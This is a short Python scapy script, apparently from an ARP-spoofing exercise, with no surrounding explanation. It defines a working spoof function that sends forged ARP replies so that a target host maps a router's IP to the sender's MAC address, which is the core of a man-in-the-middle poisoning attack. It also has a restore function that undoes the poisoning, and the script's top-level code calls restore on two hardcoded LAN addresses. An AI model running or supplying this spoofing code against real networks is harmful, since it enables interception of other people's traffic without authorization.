#!/usr/bin/env python
import time
import scapy.all as scapy
import sys

def getMacOfIp(ip):
    arp_request = scapy.ARP(pdst=ip)  # set destination ip or ip range
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # set desetination mac as broadcast mac
    arp_request_broadcast = broadcast/arp_request
    answers, unanswered = scapy.srp(arp_request_broadcast,timeout=1, verbose=False)
    return answers[0][1].hwsrc

def spoof(ipToSpoof, routerIp):
    mac = getMacOfIp(ipToSpoof)
    packet = scapy.ARP(op=2, pdst=ipToSpoof, hwdst=mac, psrc=routerIp)
    #print(packet.show())
    scapy.send(packet, verbose=False)


def restore(destIp, sourceIp):
    packet =  scapy.ARP(op=2, pdst=destIp, hwdst=getMacOfIp(destIp), psrc =sourceIp, hwsrc=getMacOfIp(sourceIp))
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose= False)


restore("192.168.1.4", "192.168.1.1")
restore("192.168.1.1", "192.168.1.4")



